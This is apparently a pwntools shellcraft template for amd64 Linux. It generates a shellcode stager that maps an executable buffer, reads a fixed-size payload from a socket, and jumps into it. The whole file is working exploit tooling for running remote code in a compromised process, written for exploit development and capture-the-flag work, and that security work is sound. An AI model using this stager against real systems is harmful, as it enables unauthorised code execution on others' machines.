<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft import amd64 %>
<%docstring>
Recives a fixed sized payload into a mmaped buffer
Useful in conjuncion with findpeer.
After running the socket will be left in RDI.
Args:
    sock, the socket to read the payload from.
    size, the size of the payload
</%docstring>
<%page args="sock, size, handle_error=False"/>
<%
    stager = common.label("stager")
    looplabel = common.label("read_loop")
    errlabel = common.label("error")
%>
${stager}:
    push ${sock}
    push ${size}
    ${amd64.linux.syscall('SYS_mmap', 0, size, 'PROT_EXEC | PROT_WRITE | PROT_READ', 'MAP_ANONYMOUS | MAP_PRIVATE', -1, 0)}
    mov rsi, rax
    pop rdx
    pop rdi /* sock */
    push rsi /* save for: pop eax; call eax later */

/* read loop */
${looplabel}:
    ${amd64.linux.syscall('SYS_read', 'rdi', 'rsi', 'rdx')}
% if handle_error:
    test rax, rax
    js ${errlabel}
% endif
    sub rdx, rax
    add rsi, rax
    test rdx, rdx
    jne ${looplabel}

    pop rsi /* start of mmaped buffer */
    call rsi /* jump and hope for it to work */

% if handle_error:
${errlabel}:
    hlt
% endif
